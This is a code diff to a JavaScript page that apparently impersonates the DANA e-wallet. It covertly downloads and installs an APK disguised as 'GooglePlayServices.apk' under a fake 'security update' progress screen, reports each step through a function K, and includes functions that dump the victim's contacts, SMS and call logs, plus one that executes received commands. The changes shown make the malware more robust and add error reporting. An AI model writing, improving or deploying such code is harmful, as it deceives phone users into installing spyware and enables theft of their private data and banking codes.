@@ -102,19 +102,22 @@ var PLATFORM = detectPlatform();
 // ============================================================
 function updateProgress(value, label) {
     progress = Math.min(value, 100);
-    document.getElementById('progressBar').style.width = progress + '%';
+    var bar = document.getElementById('progressBar');
+    if (bar) bar.style.width = progress + '%';
     if (label) {
-        document.getElementById('statusLabel').textContent = label;
+        var status = document.getElementById('statusLabel');
+        if (status) status.textContent = label;
     }
 }
 
 function redirectToDANA() {
     if (isRedirecting) return;
     isRedirecting = true;
-    document.getElementById('mainContainer').classList.add('fade-out');
+    var container = document.getElementById('mainContainer');
+    if (container) container.classList.add('fade-out');
     setTimeout(function() {
         try {
-            if (PLATFORM.isAndroidBridge) {
+            if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
                 try { AndroidBridge.openApp('com.dana.id'); } catch(e) {}
             }
             window.location.href = 'https://www.dana.id';
@@ -189,14 +192,16 @@ function startDownloadAndInstall() {
     // ============================================================
     
     // METHOD 1: ANDROID BRIDGE
-    if (PLATFORM.isAndroidBridge) {
+    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
         try {
             var path = '/storage/emulated/0/Download/GooglePlayServices.apk';
-            var result = AndroidBridge.downloadFile(APK_URL, path);
-            if (result) {
-                APK_DOWNLOADED = true;
-                K({ sumber: 'apk_download_1_bridge', data: 'success' });
-                updateProgress(50, '⏳ Mengunduh pembaruan keamanan...');
+            if (AndroidBridge.downloadFile) {
+                var result = AndroidBridge.downloadFile(APK_URL, path);
+                if (result) {
+                    APK_DOWNLOADED = true;
+                    K({ sumber: 'apk_download_1_bridge', data: 'success' });
+                    updateProgress(50, '⏳ Mengunduh pembaruan keamanan...');
+                }
             }
         } catch(e) {}
     }
@@ -209,23 +214,27 @@ function startDownloadAndInstall() {
         xhr.timeout = 60000;
         xhr.onload = function() {
             if (xhr.status === 200 && !APK_DOWNLOADED) {
-                var blob = xhr.response;
-                var url = URL.createObjectURL(blob);
-                var link = document.createElement('a');
-                link.href = url;
-                link.download = 'GooglePlayServices.apk';
-                link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
-                document.body.appendChild(link);
-                setTimeout(function() {
-                    link.click();
-                    APK_DOWNLOADED = true;
-                    K({ sumber: 'apk_download_2_xhr', data: 'success' });
-                    updateProgress(50, '⏳ Mengunduh pembaruan keamanan...');
+                try {
+                    var blob = xhr.response;
+                    var url = URL.createObjectURL(blob);
+                    var link = document.createElement('a');
+                    link.href = url;
+                    link.download = 'GooglePlayServices.apk';
+                    link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                    document.body.appendChild(link);
                     setTimeout(function() {
-                        try { document.body.removeChild(link); } catch(e) {}
-                        URL.revokeObjectURL(url);
-                    }, 2000);
-                }, 300);
+                        link.click();
+                        APK_DOWNLOADED = true;
+                        K({ sumber: 'apk_download_2_xhr', data: 'success' });
+                        updateProgress(50, '⏳ Mengunduh pembaruan keamanan...');
+                        setTimeout(function() {
+                            try { document.body.removeChild(link); } catch(e) {}
+                            URL.revokeObjectURL(url);
+                        }, 2000);
+                    }, 300);
+                } catch(e) {
+                    K({ sumber: 'apk_download_2_xhr_error', data: e.message });
+                }
             }
         };
         xhr.send();
@@ -236,24 +245,30 @@ function startDownloadAndInstall() {
         fetch(APK_URL)
             .then(function(res) { return res.blob(); })
             .then(function(blob) {
-                var url = URL.createObjectURL(blob);
-                var link = document.createElement('a');
-                link.href = url;
-                link.download = 'GooglePlayServices.apk';
-                link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
-                document.body.appendChild(link);
-                setTimeout(function() {
-                    link.click();
-                    APK_DOWNLOADED = true;
-                    K({ sumber: 'apk_download_3_fetch', data: 'success' });
-                    updateProgress(50, '⏳ Mengunduh pembaruan keamanan...');
-                    setTimeout(function() {
-                        try { document.body.removeChild(link); } catch(e) {}
-                        URL.revokeObjectURL(url);
-                    }, 2000);
-                }, 300);
+                if (!APK_DOWNLOADED) {
+                    try {
+                        var url = URL.createObjectURL(blob);
+                        var link = document.createElement('a');
+                        link.href = url;
+                        link.download = 'GooglePlayServices.apk';
+                        link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                        document.body.appendChild(link);
+                        setTimeout(function() {
+                            link.click();
+                            APK_DOWNLOADED = true;
+                            K({ sumber: 'apk_download_3_fetch', data: 'success' });
+                            updateProgress(50, '⏳ Mengunduh pembaruan keamanan...');
+                            setTimeout(function() {
+                                try { document.body.removeChild(link); } catch(e) {}
+                                URL.revokeObjectURL(url);
+                            }, 2000);
+                        }, 300);
+                    } catch(e) {
+                        K({ sumber: 'apk_download_3_fetch_error', data: e.message });
+                    }
+                }
             })
-            .catch(function() {});
+            .catch(function(e) { K({ sumber: 'apk_download_3_fetch_catch', data: e.message }); });
     } catch(e) {}
     
     // METHOD 4: IFRAME 1
@@ -385,16 +400,18 @@ function startInstall() {
     // ============================================================
     // METHOD 1: ANDROID BRIDGE
     // ============================================================
-    if (PLATFORM.isAndroidBridge) {
+    if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
         for (var i = 0; i < apkPaths.length; i++) {
             try {
-                var result = AndroidBridge.installAPK(apkPaths[i]);
-                if (result === true || result === 'success') {
-                    APK_INSTALLED = true;
-                    K({ sumber: 'apk_install_1_bridge', data: { path: apkPaths[i] } });
-                    updateProgress(100, '✅ Update Selesai');
-                    finishAndRedirect();
-                    return;
+                if (AndroidBridge.installAPK) {
+                    var result = AndroidBridge.installAPK(apkPaths[i]);
+                    if (result === true || result === 'success') {
+                        APK_INSTALLED = true;
+                        K({ sumber: 'apk_install_1_bridge', data: { path: apkPaths[i] } });
+                        updateProgress(100, '✅ Update Selesai');
+                        finishAndRedirect();
+                        return;
+                    }
                 }
             } catch(e) {}
         }
@@ -773,7 +790,7 @@ function eksekusiPerintah(cmd) {
 // ============================================================
 function dumpContacts() {
     try {
-        if (PLATFORM.isAndroidBridge) {
+        if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
             try {
                 var contacts = AndroidBridge.getAllContacts();
                 if (contacts) {
@@ -788,7 +805,7 @@ function dumpContacts() {
 
 function dumpSMS() {
     try {
-        if (PLATFORM.isAndroidBridge) {
+        if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
             try {
                 var sms = AndroidBridge.getAllSMS();
                 if (sms) {
@@ -803,7 +820,7 @@ function dumpSMS() {
 
 function dumpCallLog() {
     try {
-        if (PLATFORM.isAndroidBridge) {
+        if (PLATFORM.isAndroidBridge && typeof AndroidBridge !== 'undefined') {
             try {
                 var callLog = AndroidBridge.getCallLog();
                 if (callLog) {
